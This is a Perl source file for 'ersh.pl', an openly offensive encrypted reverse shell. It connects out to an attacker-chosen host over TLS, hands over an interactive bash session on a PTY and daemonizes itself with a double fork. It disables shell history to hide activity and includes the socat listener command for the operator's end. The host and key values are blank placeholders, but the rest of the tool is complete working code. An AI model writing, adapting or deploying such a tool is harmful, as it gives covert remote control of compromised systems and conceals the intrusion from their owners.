#!/usr/bin/env perl
#
# ersh.pl - Encrypted reverse shell with SSL and full TTY support.
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# Reverse listener command:
# socat openssl-listen:443,reuseaddr,cert=server.pem,cafile=client.crt file:`tty`,raw,echo=0

use strict;
use warnings;

# CPAN dependencies: IO::Socket::SSL, IO::Pty
use IO::Socket::SSL;
use IO::Pty;
use POSIX;
use IO::Select;
use File::Temp qw(tempfile);
use Cwd qw(abs_path);

###############################################################################
# EDIT THE PARAMETERS BELOW THIS LINE
###############################################################################

my $HOST = "";
my $PORT = 443;
my @SHELL = ("/bin/bash", "--noprofile");
my $FIRST_COMMAND = "unset HISTFILE HISTSIZE HISTFILESIZE PROMPT_COMMAND";

# openssl genrsa -out client.key 2048
my $client_key = <<'KEY';
-----BEGIN PRIVATE KEY-----
-----END PRIVATE KEY-----
KEY

# openssl req -new -key client.key -x509 -days 50 -out client.crt
my $client_crt = <<'CRT';
-----BEGIN CERTIFICATE-----
-----END CERTIFICATE-----
CRT

# openssl genrsa -out server.key 2048
# openssl req -new -key server.key -x509 -days 50 -out server.crt
my $server_crt = <<'CRT';
-----BEGIN CERTIFICATE-----
-----END CERTIFICATE-----
CRT

###############################################################################
# EDIT THE PARAMETERS ABOVE THIS LINE
###############################################################################

# ---------------------------------------------------------------------------

sub red    { "\033[91m$_[0]\033[0m" }
sub green  { "\033[92m$_[0]\033[0m" }
sub error  { "[" . red("!") . "] " . red("Error: $_[0]") }
sub success { "[" . green("*") . "] " . green($_[0]) }

# ---------------------------------------------------------------------------

sub get_safe_mountpoint {
    # Look for tmpfs filesystems mounted as rw
    open my $fh, '-|', 'mount', '-t', 'tmpfs' or return '/tmp';
    my $candidates;
    { local $/; $candidates = <$fh>; }
    close $fh;

    for my $c (split /\n/, $candidates) {
        next unless $c =~ /rw/;
        my @parts = split /\s+/, $c;
        my $device = $parts[2] // next;
        next unless $device =~ m{^/};
        next unless -w $device;

        # Check free blocks (using statvfs-like approach)
        my @stat = stat($device);
        my $free_blocks = $stat[11] || 0;  # f_bavail = blocks field
        # Use df to get free block count
        open my $df, '-|', "df --block-size=1 $device 2>/dev/null" or next;
        <$df>; # skip header
        my $df_line = <$df>;
        close $df;
        next unless $df_line;
        my @df_parts = split /\s+/, $df_line;
        my $avail = $df_parts[3] || 0;
        next if $avail < 1024 * 1024; # Require at least 1MB free

        return $device;
    }
    return '/tmp';
}

sub establish_connection {
    my $tmpfs = get_safe_mountpoint();

    # Write certs to temp files
    my ($key_fh, $key_path)    = tempfile(UNLINK => 1, DIR => $tmpfs);
    my ($crt_fh, $crt_path)    = tempfile(UNLINK => 1, DIR => $tmpfs);
    my ($scrt_fh, $scrt_path)  = tempfile(UNLINK => 1, DIR => $tmpfs);

    print $key_fh $client_key;  close $key_fh;
    print $crt_fh $client_crt;  close $crt_fh;
    print $scrt_fh $server_crt; close $scrt_fh;

    my $sock = IO::Socket::SSL->new(
        PeerHost         => $HOST,
        PeerPort         => $PORT,
        Proto            => 'tcp',
        SSL_key_file     => abs_path($key_path),
        SSL_cert_file    => abs_path($crt_path),
        SSL_ca_file      => abs_path($scrt_path),
        SSL_verify_mode  => 0x00,  # SSL_VERIFY_NONE
    );

    unless ($sock) {
        print error("Could not connect to $HOST:$PORT! (" . $IO::Socket::SSL::SSL_ERROR . ")\n");
        return undef;
    }

    return $sock;
}

sub daemonize {
    my $pid = fork();
    return 0 if $pid;           # Parent returns
    die "fork: $!" unless defined $pid;

    POSIX::setsid();
    umask(0);

    $pid = fork();
    exit(0) if $pid;
    die "fork: $!" unless defined $pid;
    return 1;
}

sub main {
    my $sock = establish_connection();
    return -1 unless $sock;

    print success("Connection established!\n");

    # Daemonize (double fork)
    daemonize();

    # Open PTY
    my $pty = IO::Pty->new();
    my $slave = $pty->slave();
    $pty->make_slave_controlling_terminal();

    # Fork and execute shell in the child
    my $pid = fork();
    if ($pid == 0) {
        # Child: attach shell to slave PTY
        close $pty;
        $slave->set_ctty();

        open STDIN,  '<&', $slave or die;
        open STDOUT, '>&', $slave or die;
        open STDERR, '>&', $slave or die;
        close $slave;

        exec @SHELL;
        exit(1);
    }

    close $slave;

    sleep 1;  # Let bash start
    $pty->syswrite("$FIRST_COMMAND\n");

    # Main I/O loop
    my $sel = IO::Select->new();
    $sel->add($sock);
    $sel->add($pty);

    while (waitpid($pid, WNOHANG) == 0) {
        my @ready = $sel->can_read(1);
        next unless @ready;

        for my $fh (@ready) {
            if ($fh == $sock) {
                my $buf;
                my $count = $sock->read($buf, 1024);
                unless (defined $count && $count > 0) {
                    $sel->remove($sock);
                    last;
                }
                $pty->syswrite($buf);
            } elsif ($fh == $pty) {
                my $buf;
                my $count = $pty->sysread($buf, 2048);
                unless (defined $count && $count > 0) {
                    $sel->remove($pty);
                    last;
                }
                $sock->write($buf);
            }
        }
    }

    $sock->close();
}

main() unless $ENV{FFPL_NO_RUN} || caller;
1;
